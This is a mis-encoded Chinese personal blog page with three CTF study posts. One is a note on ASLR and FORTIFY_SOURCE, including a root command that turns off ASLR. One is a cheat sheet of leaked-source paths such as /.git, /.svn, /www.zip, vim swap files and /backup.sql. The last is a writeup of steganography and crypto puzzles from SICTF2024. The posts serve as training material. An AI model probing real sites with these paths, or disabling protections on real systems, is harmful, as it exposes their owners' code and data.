<li>1ï¼šå¯ç”¨ ASLRï¼Œä½†åªæœ‰å †å’Œæ ˆæ˜¯éšæœºåŒ–çš„ã€‚</li>
<li>2ï¼šå¯ç”¨å®Œæ•´çš„ ASLRï¼Œæ‰€æœ‰å†…å­˜æ®µï¼ˆåŒ…æ‹¬å †ã€æ ˆã€å…±äº«åº“ç­‰ï¼‰éƒ½æ˜¯éšæœºåŒ–çš„ã€‚</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;0&quot; &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line">[!]&quot;0&quot;å¯æ¢ä¸º&quot;1&quot;æˆ–&quot;2&quot;</span><br><span class="line">[!]æ­¤å‘½ä»¤è®¾ç½®çš„æ˜¯ä½ å½“å‰ä½¿ç”¨ç³»ç»Ÿçš„ASLRï¼</span><br><span class="line"></span><br><span class="line">[*]éœ€è¦rootæƒé™</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>

<h3 id="Fortifyç›¸å…³"><a href="#Fortifyç›¸å…³" class="headerlink" title="Fortifyç›¸å…³"></a>Fortifyç›¸å…³</h3><p>FORTIFY_SOURCEæ˜¯ Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºç¦ç”¨ Fortify Source åŠŸèƒ½ï¼ŒFortify Source æ˜¯ GCC ç¼–è¯‘å™¨æä¾›çš„ä¸€ç§å®‰å…¨å¢å¼ºåŠŸèƒ½ï¼Œå½“ FORTIFY_SOURCE è®¾ç½®ä¸º 0 æ—¶ï¼Œç¼–è¯‘å™¨å°†ç¦ç”¨è¿™ä¸€å®‰å…¨åŠŸèƒ½ï¼Œä¸å†å¯¹ä»£ç è¿›è¡Œç¼“å†²åŒºæº¢å‡ºæ£€æŸ¥.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[-]FORTIFY_SOURCE=0ï¼šç¦ç”¨ Fortify åŠŸèƒ½ã€‚ ä¸ä¼šè¿›è¡Œä»»ä½•é¢å¤–çš„å®‰å…¨æ£€æŸ¥ã€‚ å¯èƒ½å¯¼è‡´æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</span><br><span class="line">[-]FORTIFY_SOURCE=1ï¼šå¯ç”¨ Fortify åŠŸèƒ½çš„åŸºæœ¬çº§åˆ«ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œä¸€äº›å®‰å…¨æ£€æŸ¥ï¼Œå¦‚ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€æ ¼å¼åŒ–å­—ç¬¦ä¸²æ£€æŸ¥ç­‰ã€‚ åœ¨è¿è¡Œæ—¶è¿›è¡ŒæŸäº›æ£€æŸ¥ï¼Œå¦‚æ£€æµ‹å‡½æ•°è¿”å›å€¼å’Œå¤§å°çš„ä¸€è‡´æ€§ã€‚ å¦‚æœæ£€æµ‹åˆ°æ½œåœ¨çš„å®‰å…¨é—®é¢˜ï¼Œä¼šè§¦å‘è¿è¡Œæ—¶é”™è¯¯ï¼Œå¹¶ç»ˆæ­¢ç¨‹åºæ‰§è¡Œã€‚</span><br><span class="line">[-]FORTIFY_SOURCE=2ï¼šå¯ç”¨ Fortify åŠŸèƒ½çš„é«˜çº§çº§åˆ«ã€‚ åŒ…æ‹¬åŸºæœ¬çº§åˆ«çš„å®‰å…¨æ£€æŸ¥ï¼Œå¹¶æ·»åŠ äº†æ›´å¤šçš„æ£€æŸ¥ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå¦‚æ›´ç²¾ç¡®çš„ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€‚ æä¾›æ›´ä¸°å¯Œçš„ç¼–è¯‘å™¨è­¦å‘Šå’Œé”™è¯¯ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure>

<h3 id="argc"><a href="#argc" class="headerlink" title="argc"></a>argc</h3><p>åœ¨ C è¯­è¨€ä¸­ï¼Œargc æ˜¯ main() å‡½æ•°çš„å‚æ•°ï¼Œç”¨äºè¡¨ç¤ºç¨‹åºè¿è¡Œæ—¶å‘½ä»¤è¡Œå‚æ•°çš„æ•°é‡ï¼ˆargument countï¼‰ã€‚å…¶ä¸­ï¼Œargc æ˜¯ä¸€ä¸ªæ•´æ•°å€¼ï¼Œè¡¨ç¤ºå‘½ä»¤è¡Œå‚æ•°çš„æ•°é‡ï¼ŒåŒ…æ‹¬ç¨‹åºåç§°æœ¬èº«ã€‚</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://jasmineaura.github.io/2024/07/29/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="JasmineAura">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JasmineAura's Blog">
      <meta itemprop="description" content="It's just a matter of time">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | JasmineAura's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/07/29/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="post-title-link" itemprop="url">ä¿¡æ¯æœé›†</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2024-07-29 16:07:25 / ä¿®æ”¹æ—¶é—´ï¼š16:09:12" itemprop="dateCreated datePublished" datetime="2024-07-29T16:07:25+08:00">2024-07-29</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h3 id="index-phps"><a href="#index-phps" class="headerlink" title="index.phps"></a><code>index.phps</code></h3><p>æœ‰äº›é¢˜ç›®å¯ä»¥ç›´æ¥è®¿é—® <code>/index.phps</code> ï¼Œå¯ä»¥ä¸‹è½½æºç .</p>
<h3 id="www-zip"><a href="#www-zip" class="headerlink" title="www.zip"></a><code>www.zip</code></h3><p>æœ‰äº›é¢˜ç›®å¯ä»¥ç›´æ¥è®¿é—® <code>/www.zip</code>ï¼Œä»è€Œä¸‹è½½æºç å‹ç¼©åŒ…ï¼Œæ‰¾åˆ°flag.</p>
<h3 id="git-index-php"><a href="#git-index-php" class="headerlink" title="/.git/index.php"></a><code>/.git/index.php</code></h3><p>æœ‰äº›é¢˜ç›®æœ‰ç‰ˆæœ¬æ§åˆ¶ï¼Œä½†éƒ¨ç½²åˆ°äº†ç”Ÿäº§ç¯å¢ƒï¼Œä»è€Œå¯ä»¥è®¿é—® <code>/.git/index.php</code> æ¥è·å–æºç .</p>
<h3 id="svn"><a href="#svn" class="headerlink" title="/.svn/"></a><code>/.svn/</code></h3><p>svnæ³„éœ²,å¯ä»¥ç›´æ¥è®¿é—® <code>/.svn/</code> å¾—åˆ°ç›¸å…³ä¿¡æ¯.</p>
<h3 id="DS-store"><a href="#DS-store" class="headerlink" title=".DS_store"></a>.DS_store</h3><p>.DS_storeæ³„éœ².</p>
<h3 id="vimç¼“å­˜æ³„éœ²"><a href="#vimç¼“å­˜æ³„éœ²" class="headerlink" title="vimç¼“å­˜æ³„éœ²"></a>vimç¼“å­˜æ³„éœ²</h3><p>vimåœ¨ç¼–è¾‘æ–‡æœ¬æ—¶ä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœéæ­£å¸¸é€€å‡ºï¼Œä¸´æ—¶æ–‡ä»¶å°±ä¼šä¿ç•™.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ä»¥index.phpä¸ºä¾‹</span><br><span class="line">ç¬¬ä¸€æ¬¡å¼‚å¸¸é€€å‡ºåï¼Œæ–‡ä»¶åä¸º.index.php.swp</span><br><span class="line">ç¬¬äºŒæ¬¡ï¼Œæ–‡ä»¶åä¸º.index.php.swo</span><br><span class="line">ç¬¬ä¸‰æ¬¡ï¼Œæ–‡ä»¶åä¸º.index.php.swn</span><br><span class="line"><span class="comment">#æœ‰æ—¶éœ€è¦å»æ‰.indexä¸­çš„&quot;.&quot;</span></span><br></pre></td></tr></table></figure>

<h3 id="ç¼–è¾‘å™¨æ¼æ´"><a href="#ç¼–è¾‘å™¨æ¼æ´" class="headerlink" title="ç¼–è¾‘å™¨æ¼æ´"></a>ç¼–è¾‘å™¨æ¼æ´</h3><p>è®¿é—® <code>/editor</code> è·¯å¾„ï¼Œæœ‰æ—¶ä¼šè¿›å…¥ç¼–è¾‘å™¨ç•Œé¢ï¼Œä»è€ŒæŸ¥çœ‹æ‰€æœ‰æ–‡ä»¶è·¯å¾„.<br>![[Pasted image 20240725092702.png]]</p>
<h3 id="admin"><a href="#admin" class="headerlink" title="/admin"></a><code>/admin</code></h3><p>ä¸€å®šè¦è¯•ç€å»è®¿é—® <code>/admin</code>ï¼Œæœ‰äº›é¢˜ç›®çš„flagå°±ä¼šè—åœ¨é‡Œé¢.</p>
<h3 id="phpæ¢é’ˆ"><a href="#phpæ¢é’ˆ" class="headerlink" title="phpæ¢é’ˆ"></a>phpæ¢é’ˆ</h3><p>phpæ¢é’ˆæ˜¯ç”¨æ¥æ¢æµ‹ç©ºé—´ã€æœåŠ¡å™¨è¿è¡ŒçŠ¶å†µå’ŒPHPä¿¡æ¯ç”¨çš„ï¼Œæ¢é’ˆå¯ä»¥å®æ—¶æŸ¥çœ‹æœåŠ¡å™¨ç¡¬ç›˜èµ„æºã€å†…å­˜å ç”¨ã€ç½‘å¡ æµé‡ã€ç³»ç»Ÿè´Ÿè½½ã€æœåŠ¡å™¨æ—¶é—´ç­‰ä¿¡æ¯ã€‚<br>æœ‰äº›é¢˜ç›®å¯ä»¥è®¿é—® <code>/tz.php</code> æ¥æŸ¥çœ‹æ¢é’ˆï¼Œæœ‰çš„flagå¯èƒ½ä¼šè—åœ¨æ¢é’ˆä¸­çš„phpinfoé‡Œ.</p>
<h3 id="å¤‡ä»½çš„sqlæ–‡ä»¶æ³„éœ²"><a href="#å¤‡ä»½çš„sqlæ–‡ä»¶æ³„éœ²" class="headerlink" title="å¤‡ä»½çš„sqlæ–‡ä»¶æ³„éœ²"></a>å¤‡ä»½çš„sqlæ–‡ä»¶æ³„éœ²</h3><p><code>/backup.sql</code> å†…å¯èƒ½å«æœ‰flag.</p>
<h3 id="mdbæ–‡ä»¶æ³„éœ²"><a href="#mdbæ–‡ä»¶æ³„éœ²" class="headerlink" title="mdbæ–‡ä»¶æ³„éœ²"></a>mdbæ–‡ä»¶æ³„éœ²</h3><p>mdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œè®¿é—® <code>/db/db.mdb</code> ä¸‹è½½æ–‡ä»¶ï¼Œflagå¯èƒ½å°±åœ¨å…¶ä¸­.</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://jasmineaura.github.io/2024/02/19/SICTF2024-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="JasmineAura">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="JasmineAura's Blog">
      <meta itemprop="description" content="It's just a matter of time">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | JasmineAura's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/02/19/SICTF2024-Writeup/" class="post-title-link" itemprop="url">SICTF2024 Writeup</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>

      <time title="åˆ›å»ºæ—¶é—´ï¼š2024-02-19 00:01:36" itemprop="dateCreated datePublished" datetime="2024-02-19T00:01:36+08:00">2024-02-19</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">æ›´æ–°äº</span>
      <time title="ä¿®æ”¹æ—¶é—´ï¼š2024-02-22 23:08:11" itemprop="dateModified" datetime="2024-02-22T23:08:11+08:00">2024-02-22</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="ç­¾åˆ°-ç­¾åˆ°"><a href="#ç­¾åˆ°-ç­¾åˆ°" class="headerlink" title="[ç­¾åˆ°]ç­¾åˆ°"></a>[ç­¾åˆ°]ç­¾åˆ°</h4><p>å¦‚é¢˜ï¼Œæ‰“å¼€â€œå¾®ä¿¡â€ï¼Œæ‰«ç ï¼Œå…³æ³¨å…¬ä¼—å·ï¼Œå‘é€SICTF{Round3ï¼Œæˆ‘æ¥è¾£~}ï¼Œå¾—åˆ°flag.</p>
<h4 id="é—®å·è°ƒæŸ¥"><a href="#é—®å·è°ƒæŸ¥" class="headerlink" title="é—®å·è°ƒæŸ¥"></a>é—®å·è°ƒæŸ¥</h4><p>å¦‚é¢˜ï¼Œå¡«å†™é—®å·ï¼Œå¾—åˆ°flag.</p>
<h4 id="WHO-WHO-WHO"><a href="#WHO-WHO-WHO" class="headerlink" title="WHO?WHO?WHO"></a>WHO?WHO?WHO</h4><p>è„‘æ´é¢˜ã€‚</p>
<p>é¦–å…ˆæ‹¿åˆ°å‹ç¼©åŒ…ï¼Œå°è¯•å°å†™å­—æ¯çˆ†ç ´ï¼ŒæˆåŠŸçˆ†ç ´å‡ºå¯†ç ï¼šqweqweã€‚</p>
<p>è§£å‹å‡ºæ¥ä¸ªæ–‡æœ¬ï¼Œå‘ç°é‡Œé¢åªæœ‰å‡ ä¸ªå¯è§å­—ç¬¦ï¼Œç”¨Vscodeæ‰“å¼€ï¼Œå‘ç°è¿™æ˜¯é›¶å®½éšå†™ã€‚</p>
<p><img src="/images/image-20240218193817941.png" alt="image-20240218193817941"></p>
<p>ç”¨åœ¨çº¿ç½‘ç«™å»è§£ï¼Œå¥‡æ€ªçš„æ˜¯ä¸åŒç½‘ç«™è§£å‡ºçš„ç»“æœä¸ä¸€æ ·ï¼Œè¿™é‡Œä½¿ç”¨<a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/">Zero Width Lib (yuanfux.github.io)</a>è§£å‡ºäº†æ­£ç¡®çš„å†…å®¹ã€‚</p>
<p><img src="/images/image-20240218193930408.png" alt="image-20240218193930408"></p>
<p>å‰©ä¸‹çš„ä¸œè¥¿çœ‹è§åƒbase64ï¼Œä½†æ˜¯è§£å‡ºæ¥æ˜¯ä¹±ç ï¼Œå¼€å¤´æ˜¯Salted__ï¼Œæ¨æ–­å‡ºè¿™ä¸ªå­—ç¬¦ä¸²æ˜¯RabbitåŠ å¯†å¾—å‡ºçš„ã€‚</p>
<p>è§£å¯†è¿™ä¸ªå­—ç¬¦ä¸²è¿˜éœ€è¦å¯†é’¥ï¼Œæ ¹æ®é¢˜ç›®æç¤ºæˆ‘ä»¬å¯ä»¥å¾—çŸ¥å¯†é’¥æ˜¯â€œæ ‘æœ¨â€çš„æ‹¼éŸ³ï¼Œå³shumuã€‚</p>
<p><img src="/images/image-20240218194126624.png" alt="image-20240218194126624"></p>
<p>æ¥è§¦æ¥äº†ä¸€ä¸ªæ ¼å¼å’Œflagå·®ä¸å¤šçš„å­—ç¬¦ä¸²ï¼Œæ ¹æ®ä¹‹å‰çš„txtæ–‡ä»¶åå¯çŸ¥è¿™æ˜¯DNAç¼–ç ï¼Œåœ¨çº¿è§£å¯†ç½‘ç«™æ‰¾ä¸åˆ°ï¼Œæˆ‘ç›´æ¥æ‰¾åˆ°äº†è¡¨æ‰‹åŠ¨è§£å¯†ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&#x27;AAA&#x27;:&#x27;a&#x27;,</span><br><span class="line">&#x27;AAC&#x27;:&#x27;b&#x27;,</span><br><span class="line">&#x27;AAG&#x27;:&#x27;c&#x27;,</span><br><span class="line">&#x27;AAT&#x27;:&#x27;d&#x27;,</span><br><span class="line">&#x27;ACA&#x27;:&#x27;e&#x27;,</span><br><span class="line">&#x27;ACC&#x27;:&#x27;f&#x27;, </span><br><span class="line">&#x27;ACG&#x27;:&#x27;g&#x27;,</span><br><span class="line">&#x27;ACT&#x27;:&#x27;h&#x27;,</span><br><span class="line">&#x27;AGA&#x27;:&#x27;i&#x27;,</span><br><span class="line">&#x27;AGC&#x27;:&#x27;j&#x27;,</span><br><span class="line">&#x27;AGG&#x27;:&#x27;k&#x27;,</span><br><span class="line">&#x27;AGT&#x27;:&#x27;l&#x27;,</span><br><span class="line">&#x27;ATA&#x27;:&#x27;m&#x27;,</span><br><span class="line">&#x27;ATC&#x27;:&#x27;n&#x27;,</span><br><span class="line">&#x27;ATG&#x27;:&#x27;o&#x27;,</span><br><span class="line">&#x27;ATT&#x27;:&#x27;p&#x27;,</span><br><span class="line">&#x27;CAA&#x27;:&#x27;q&#x27;,</span><br><span class="line">&#x27;CAC&#x27;:&#x27;r&#x27;,</span><br><span class="line">&#x27;CAG&#x27;:&#x27;s&#x27;,</span><br><span class="line">&#x27;CAT&#x27;:&#x27;t&#x27;,</span><br><span class="line">&#x27;CCA&#x27;:&#x27;u&#x27;,</span><br><span class="line">&#x27;CCC&#x27;:&#x27;v&#x27;,</span><br><span class="line">&#x27;CCG&#x27;:&#x27;w&#x27;,</span><br><span class="line">&#x27;CCT&#x27;:&#x27;x&#x27;,</span><br><span class="line">&#x27;CGA&#x27;:&#x27;y&#x27;,</span><br><span class="line">&#x27;CGC&#x27;:&#x27;z&#x27;,</span><br><span class="line">&#x27;CGG&#x27;:&#x27;A&#x27;,</span><br><span class="line">&#x27;CGT&#x27;:&#x27;B&#x27;,</span><br><span class="line">&#x27;CTA&#x27;:&#x27;C&#x27;,</span><br><span class="line">&#x27;CTC&#x27;:&#x27;D&#x27;,</span><br><span class="line">&#x27;CTG&#x27;:&#x27;E&#x27;,</span><br><span class="line">&#x27;CTT&#x27;:&#x27;F&#x27;,</span><br><span class="line">&#x27;GAA&#x27;:&#x27;G&#x27;,</span><br><span class="line">&#x27;GAC&#x27;:&#x27;H&#x27;,</span><br><span class="line">&#x27;GAG&#x27;:&#x27;I&#x27;,</span><br><span class="line">&#x27;GAT&#x27;:&#x27;J&#x27;,</span><br><span class="line">&#x27;GCA&#x27;:&#x27;K&#x27;,</span><br><span class="line">&#x27;GCC&#x27;:&#x27;L&#x27;,</span><br><span class="line">&#x27;GCG&#x27;:&#x27;M&#x27;,</span><br><span class="line">&#x27;GCT&#x27;:&#x27;N&#x27;,</span><br><span class="line">&#x27;GGA&#x27;:&#x27;O&#x27;,</span><br><span class="line">&#x27;GGC&#x27;:&#x27;P&#x27;,</span><br><span class="line">&#x27;GGG&#x27;:&#x27;Q&#x27;,</span><br><span class="line">&#x27;GGT&#x27;:&#x27;R&#x27;,</span><br><span class="line">&#x27;GTA&#x27;:&#x27;S&#x27;,</span><br><span class="line">&#x27;GTC&#x27;:&#x27;T&#x27;,</span><br><span class="line">&#x27;GTG&#x27;:&#x27;U&#x27;,</span><br><span class="line">&#x27;GTT&#x27;:&#x27;V&#x27;,</span><br><span class="line">&#x27;TAA&#x27;:&#x27;W&#x27;,</span><br><span class="line">&#x27;TAC&#x27;:&#x27;X&#x27;,</span><br><span class="line">&#x27;TAG&#x27;:&#x27;Y&#x27;,</span><br><span class="line">&#x27;TAT&#x27;:&#x27;Z&#x27;,</span><br><span class="line">&#x27;TCA&#x27;:&#x27;1&#x27;,</span><br><span class="line">&#x27;TCC&#x27;:&#x27;2&#x27;,</span><br><span class="line">&#x27;TCG&#x27;:&#x27;3&#x27;,</span><br><span class="line">&#x27;TCT&#x27;:&#x27;4&#x27;,</span><br><span class="line">&#x27;TGA&#x27;:&#x27;5&#x27;,</span><br><span class="line">&#x27;TGC&#x27;:&#x27;6&#x27;,</span><br><span class="line">&#x27;TGG&#x27;:&#x27;7&#x27;,</span><br><span class="line">&#x27;TGT&#x27;:&#x27;8&#x27;,</span><br><span class="line">&#x27;TTA&#x27;:&#x27;9&#x27;,</span><br><span class="line">&#x27;TTC&#x27;:&#x27;0&#x27;,</span><br><span class="line">&#x27;TTG&#x27;:&#x27; &#x27;,</span><br><span class="line">&#x27;TTT&#x27;:&#x27;.&#x27;</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸‰ä¸ªå­—ç¬¦æ›¿æ¢ï¼Œå¾—åˆ°flagï¼šSICTF{Q1A0_Q1A0_GA0_SU_N1_SHUMU_SH1_ZHA_NAN}.</p>
<h4 id="çœŸğŸ’¨ç­¾åˆ°"><a href="#çœŸğŸ’¨ç­¾åˆ°" class="headerlink" title="çœŸğŸ’¨ç­¾åˆ°"></a>çœŸğŸ’¨ç­¾åˆ°</h4><p>æ–‡å­—æ¸¸æˆã€‚</p>
<p>é¦–å…ˆæ‹¿åˆ°å‹ç¼©åŒ…ï¼Œ010æ‰“å¼€ï¼Œå‘ç°æœ€ååˆä¸€ä¸²16è¿›åˆ¶æ•°å­—ã€‚</p>
<p><img src="/images/image-20240218212910089.png" alt="image-20240218212910089"></p>
<p>è½¬ä¸€ä¸‹ï¼Œå¾—åˆ°ä¸€ä¸²çœ‹ç€åƒbase64çš„å­—ç¬¦ä¸²ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TVTTTVTXABYUXTXTXCARYYXAZCYYYUXV=</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æç¤ºæ–‡æœ¬è½¬å­—æ¯ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå°‘è§çš„åŠ å¯†æ–¹å¼ï¼Œä½¿ç”¨åœ¨çº¿ç½‘ç«™è§£å¯†ã€‚</p>
<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu">https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=zimu</a></p>
<p><img src="/images/image-20240218213020885.png" alt="image-20240218213020885"></p>
<p>å¾—åˆ°å‹ç¼©åŒ…å¯†ç 2024HappyNewYear</p>
<p>è§£å‹åå¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªæ˜¯steg.jpgï¼Œå¦ä¸€ä¸ªæ˜¯LagrangeisCapatlized.wavã€‚</p>
<p>å…ˆåˆ†æéŸ³é¢‘æ–‡ä»¶ï¼Œç”¨Audacityæ‰“å¼€ï¼Œæ³¢å½¢å›¾ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œåˆ‡æ¢åˆ°é¢‘è°±å›¾ï¼Œè¿˜æ˜¯ä»€ä¹ˆä¹Ÿæ²¡æœ‰ã€‚</p>
<p>è°ƒæ•´ä¸€ä¸‹é‡‡æ ·ç‡åˆ°11025HZå·¦å³ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
<p><img src="/images/image-20240218213831238.png" alt="image-20240218213831238"></p>
<p><img src="/images/image-20240218213853166.png" alt="image-20240218213853166"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">givemeyourlagrange</span><br></pre></td></tr></table></figure>

<p>çŒœæµ‹å¯èƒ½æ˜¯æŸç§åŠ å¯†ä½¿ç”¨çš„å¯†é’¥ã€‚</p>
<p>ä½¿ç”¨binwalkçœ‹ä¸€ä¸‹steg.jpgï¼Œå‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚</p>
<p>è§‚å¯Ÿsteg.jpgçš„åå­—ï¼Œå°è¯•ä½¿ç”¨steghideå·¥å…·æ¥è§£å¯†ï¼Œå¯†é’¥æ˜¯åˆšæ‰æˆ‘ä»¬å¾—åˆ°çš„givemeyourlagrange</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf steg.jpg -p givemeyourlagrange</span><br></pre></td></tr></table></figure>

<p>è·‘ä¸€ä¸‹ï¼Œå‘ç°ä»€ä¹ˆéƒ½æ²¡è·‘å‡ºæ¥ã€‚æˆ‘ä»¬å†è§‚å¯ŸLagrangeisCapatlized.wavçš„æ–‡ä»¶åï¼Œç¿»è¯‘ä¸€ä¸‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Lagrange is Capatlized  ---&gt;  Lagrangeæ˜¯å¤§å†™çš„</span><br></pre></td></tr></table></figure>

<p>äºæ˜¯ä¿®æ”¹ä¸€ä¸‹æˆ‘ä»¬çš„å¯†é’¥ï¼Œå˜ä¸ºgivemeyourLAGRANGE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">givemeyourLAGRANGE</span><br></pre></td></tr></table></figure>

<p>é‡æ–°ç”¨steghideè·‘ä¸€éã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf steg.jpg -p givemeyourLAGRANGE</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20240218214526350.png" alt="image-20240218214526350"></p>
<p>å¾—åˆ°flag.txtï¼Œæ‰¾åˆ°flagï¼šSICTF{T3e_endless_Lagrange_is_really_fun!}</p>
<p><img src="/images/image-20240218214531711.png" alt="image-20240218214531711"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h4 id="ç­¾åˆ°-Vigenere"><a href="#ç­¾åˆ°-Vigenere" class="headerlink" title="[ç­¾åˆ°]Vigenere"></a>[ç­¾åˆ°]Vigenere</h4><p>ä»é¢˜ç›®åå­—å¯çŸ¥è¿™æ˜¯ç»´å‰å°¼äºšå¯†ç ï¼Œæ–‡æœ¬ä¸­æ‰¾åˆ°</p>
<p><img src="/images/image-20240218180502654.png" alt="image-20240218180502654"></p>
<p>è¿™æ˜¯å¯†æ–‡ï¼Œå‰é¢çš„LNUTFå¯¹åº”SICTFï¼Œç”¨åœ¨çº¿ç½‘ç«™è§£å¯†ã€‚</p>
<p><img src="/images/image-20240218180804440.png" alt="image-20240218180804440"></p>
<p>å¯ä»¥æ¨å‡ºå¯†é’¥ä¸ºTFSAAï¼Œè§£å¯†å¾—åˆ°flag.</p>
<h4 id="gggcccddd"><a href="#gggcccddd" class="headerlink" title="gggcccddd"></a>gggcccddd</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1 = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(<span class="number">233</span>*m+<span class="number">9527</span>,e,n)</span><br></pre></td></tr></table></figure>



